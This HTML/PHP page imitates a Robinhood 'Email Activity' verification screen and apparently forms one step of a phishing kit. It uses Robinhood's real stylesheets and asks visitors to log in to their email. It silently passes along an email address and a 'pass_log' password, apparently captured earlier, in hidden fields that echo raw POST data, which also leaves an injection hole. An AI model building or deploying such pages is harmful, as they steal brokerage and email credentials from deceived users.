<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Email Activity | Robinhood</title>
</head>
<body class="theme-open-up">
<div id="react_root">
	<div>
		<div class="css-10d7enp">
						<div class="css-slob1f">
							<div>
								<center>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST"  action="a/email">
									<img src="img/email.png" width="150">
									<header class="css-240zvz"><span class="css-1wyk9uc">Please log in to your email to verify that this is you.</span></header>
									<div class="css-16x6d1u">
										<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
										<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
										<div>
										<p aria-live="assertive">
											<div class="_2QawT-EkOq7gIQN1hHcFqU" style="height: 0px; transition-duration: 300ms;">
												<div class="_3UC6vIw0Z8kgiibABGCPT2">
													<div></div>
												</div>
											</div>
										</p>
									</div>
									<div class="css-0">
										<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Continue</span></button>
									</div>
								</form>
								</center>
							</div>
						</div>
					</div>
				</div>
			</div>
</div>
</body>
</html>